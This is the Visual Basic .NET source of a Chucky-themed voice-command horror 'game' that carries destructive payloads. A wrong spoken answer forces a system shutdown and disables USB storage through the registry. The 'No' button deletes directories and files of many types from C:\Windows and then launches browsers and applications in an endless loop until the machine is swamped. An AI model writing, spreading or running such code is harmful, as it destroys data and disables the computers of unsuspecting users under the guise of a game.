Imports System.Speech
Imports Microsoft.Win32

Public Class PlayTime
    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(10) ' The number 10 (to the left) will alter your time on the countdown
    Private WithEvents PlayTime As New Recognition.SpeechRecognitionEngine
    Public synth As New Speech.Synthesis.SpeechSynthesizer
    Dim gram As New System.Speech.Recognition.DictationGrammar()


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label5.Text = ts.ToString("hh\:mm\:ss")
        Else
            Label5.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>

        End If
    End Sub

    Private Sub PlayTime_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        Dim Ans As Integer
        Ans = MsgBox("HERE ARE SOME VOICE COMMANDS YOU WILL NEED TO USE, WRITE THEM DOWN", 0, "CHUCKY")
        If Ans = 1 Then
            MsgBox("CHUCKY PLEASE STOP, OH GOD HELP ME, FUCK ME I DONT KNOW")
        End If

        PlayTime.SetInputToDefaultAudioDevice()

        Dim Grammar As New Recognition.SrgsGrammar.SrgsDocument

        Dim WordRule As New Recognition.SrgsGrammar.SrgsRule("Word")

        Dim Wordlist As New Recognition.SrgsGrammar.SrgsOneOf("CHUCKY PLEASE STOP", "OH GOD HELP ME", "CHARLES LEE RAY", "FUCK ME I DONT KNOW", "JOYCE DAHMER")

        WordRule.Add(Wordlist)

        Grammar.Rules.Add(WordRule)

        Grammar.Root = WordRule

        PlayTime.LoadGrammar(New Recognition.Grammar(Grammar))
        PlayTime.RecognizeAsync()


    End Sub

    Private Sub PlayTime_SpeechRecognized(sender As Object, e As Recognition.SpeechRecognizedEventArgs) Handles PlayTime.SpeechRecognized
        Select Case e.Result.Text
            Case "CHUCKY PLEASE STOP"
                My.Computer.Audio.Play(My.Resources.youre_a_fucking_drag_you_know_that, AudioPlayMode.Background)
                Process.Start("https://www.youtube.com/watch?v=Lfl53kiHa30&autoplay=1&mute=1")

            Case "JOYCE DAHMER"
                My.Computer.Audio.Play(My.Resources.you_little_shit, AudioPlayMode.Background)
                Dim Ans As Integer
                Ans = MsgBox("THINK YOUR FUCKIN' SMART, DON'T YA?", 0, "CHUCKY")
                NextStep.Show()
                Me.Hide()

            Case "FUCK ME I DONT KNOW"
                Dim Ans As Integer
                Ans = MsgBox("WRONG ANSWER!!!", 0, "CHUCKY")
                My.Computer.Audio.Play(My.Resources.charles_lee_ray, AudioPlayMode.BackgroundLoop)
                Timer1.Interval = 100
                TargetDT = DateTime.Now.Add(CountDownFrom)
                Timer1.Start()
                My.Computer.Audio.Play(My.Resources.failure, AudioPlayMode.Background)
                Shell("shutdown -s -t 60")
                Dim regKey As RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey(name:="SYSTEM\CurrentControlSet\Services\USBSTOR", writable:=True)
                regKey.SetValue("Start", 4)

            Case "CHARLES LEE RAY"
                Dim Ans As Integer
                Ans = MsgBox("THAT'S RIGHT", 0, "CHUCKY")
                NextStep.Show()
                Me.Hide()


            Case "OH GOD HELP ME"
                'Go to new form for progression
                Me.Hide()
                My.Computer.Audio.Play(My.Resources.close_your_eyes_and_count_to_7, AudioPlayMode.Background)
                Dim Ans As Integer
                Ans = MsgBox("YOU WANTED TO PLAY", 0, "CHUCKY")
                Doom.Show()


        End Select

    End Sub

    Private Sub PlayTime_RecognizeCompleted(sender As Object, e As Recognition.RecognizeCompletedEventArgs) Handles PlayTime.RecognizeCompleted
        PlayTime.RecognizeAsync()
    End Sub



    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click 'Yes Button///
        My.Computer.Audio.Play(My.Resources.hide_the_soul, AudioPlayMode.Background)
        NextStep.Show()
        Me.Hide()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click 'No Button///
        My.Computer.Audio.Play(My.Resources.hey_youre_pissing_your_pants, AudioPlayMode.BackgroundLoop)
        Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\C:\Windows" 'Add Path/Directory here///
        System.IO.Directory.Delete(path, True)
        Dim directory As New IO.DirectoryInfo("C:\Windows") 'Your Path/Directory

        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".txt") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The Days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".exe") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".jpg") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".jpeg") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".rar") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".bat") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".gif") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".mp4") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".mp3") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".mov") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".wav") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        Do
            Process.Start("chrome")  'Loops from Hell>>>All will activate at once like Machine Gun Fire///
            Process.Start("opera")                     ''                           ''
            Process.Start("firefox")                   ''                           ''
            Process.Start("notepad")                   ''                           ''
            Process.Start("winword")                   ''                           ''
            Process.Start("wordpad")                   ''                           ''
            Process.Start("wmplayer")                  ''                           ''
        Loop

    End Sub
End Class